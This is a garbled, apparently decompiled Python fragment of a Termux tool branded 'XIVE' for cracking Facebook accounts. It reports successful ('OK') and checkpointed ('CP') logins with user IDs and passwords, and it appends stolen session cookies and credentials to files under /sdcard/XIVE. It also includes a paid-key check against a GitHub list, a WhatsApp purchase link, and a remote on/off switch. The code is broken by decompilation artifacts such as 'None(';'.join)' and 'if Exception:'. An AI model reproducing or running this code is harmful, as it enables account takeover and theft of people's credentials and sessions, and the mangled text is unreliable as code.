                                    print(f'''{B}[XIVE-CP] ''' + cok['c_user'] + ' | ' + passw + '\x1b[0;97m     ')
                            for key, value in []:
                                value = self.ses.cookies.get_dict().items()[f'''{key!s}={value!s}''']
                                key = self.ses.cookies.get_dict().items()
                                coki = None(';'.join)
                                cok = self.ses.cookies.get_dict()
                                print(f'''\r{G}[XIVE-OK] ''' + cok['c_user'] + ' | ' + passw + '')
                                print(f'''\r{G}[COOKIE]{BU} ''' + coki)
                                linex()
                                open('/sdcard/XIVE/XIVE-AUTO-COOKIE.txt', 'a').write(cok['c_user'] + '|' + passw + '|' + coki + '\n')
                                open('/sdcard/XIVE/XIVE-AUTO-UID.txt', 'a').write(cok['c_user'] + '|' + passw + '\n')
                                ok.append(email + passw)
                                print('')
                                linex()
                                print(f'''{A}[{R}+{A}] {G}TOTAL OK ID {R}:{G} ''' + str(len(ok)))
                                print(f'''{A}[{R}+{A}] {G}TOTAL CP ID {R}: ''' + str(len(cp)))
                                linex()
                                return None
                                if KeyError:
                                    'preferred_pronoun'
            if requests.exceptions.ConnectionError:
                'sex'
                time.sleep(1)
            if Exception:
                e = 'sex'
                e = None
                del e
                e = None
                del e
            'field_names[3]'
            'reg_email__'
            'reg_email__'
            'field_names[2]'
            ''
            value = 'did_use_age'
            key = ''
            if requests.exceptions.ConnectionError:
                'age_step_input'
            if Exception:
                e = str(random.randint(1992, 2004))
                e = None
                del e
                e = None
                del e


    
    def gx():
        os.system('clear')
        print(logo)
        attemps = 0
        if attemps < 0x2DFDC184DL:
            username = input(f''' {green} Submit Your Token :''')
            if username == f'''{token}''':
                print('----------------------------------')
                return None
            print(f''' {red}Wrong Token ''')
            exit()
            if attemps < 0x2DFDC184DL:
                pass
            return None

    
    def pp():
        ky = open('/sdcard/Android/.nonmedia.js', 'r').read()
        if None(len) > 32:
            os.system('rm -rf /sdcard/Android/.nonmedia.js')
            pp()
        if len(ky) < 32:
            os.system('rm -rf /sdcard/Android/.nonmedia.js')
            pp()
        clear()
        print(' [•] wait checking approval...!')
        system = requests.get('https://github.com/xive7/Paid/blob/main/Approved.txt').text
        if ky in system:
            linex()
            print(' [√] your key approved...!')
            time.sleep(2)
            return None
        linex()
        print(' [×] your key not approved...!')
        time.sleep(2)
        clear()
        print(f''' \x1b[1;31mYour Key : {str(ky)} ''')
        linex()
        lol = input(' \x1b[1;31mNOTE \x1b[1;92m➤\x1b[1;37m IF YOU BUY THEN PRESS ENTER :')
        xx = '➤➤Selected=='
        os.system('xdg-open https://wa.me/+8801332718196?text=' + str(ky) + lol)
        pp()
        return None
        if FileNotFoundError:
            op = uuid.uuid1().hex.upper()
            open('/sdcard/Android/.nonmedia.js', 'w').write(op)
            pp()
        if (KeyError, OSError, IOError):
            linex()
            os.system('termux-setup-storage')
            print(' [×] allow storage permission ')
            pp()
        if requests.exceptions.ConnectionError:
            exit(' [!] Your Internet Connection Lol...!')
            return None
        if Exception:
            e = None
            print(e)
            e = None
            del e
            return None
            e = None
            del e

    server = requests.get('https://raw.githubusercontent.com/xive7/Server/refs/heads/main/Server.txt').text.strip()
    if server in ('on',):
        menu()
if server in ('down',):
    print(f'''{R}Server Down Please Wait''')
if server in ('update',):
    print(f'''{G}Tool Updating Please Wait Few Minutes''')
if server in ('off',):
    print(f'''{R} Server Off Please Wait''')
    return None
return None
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python xive.py')
if Exception:
    e = None
    e = None
    del e
    e = None
    del e
print('No Internet Connection')
exit()
print('No Internet Connection')
exit()
if Exception:
    e = None
    carrier = None
    e = None
    del e
    e = None
    del e
os.system('pip3 install requests')
import requests
if ImportError:
    os.system('pip install requests > /dev/null')
if ImportError:
    print('\n [×] Modul Bs4 Not installed!...\n')
    os.system('pip install bs4')
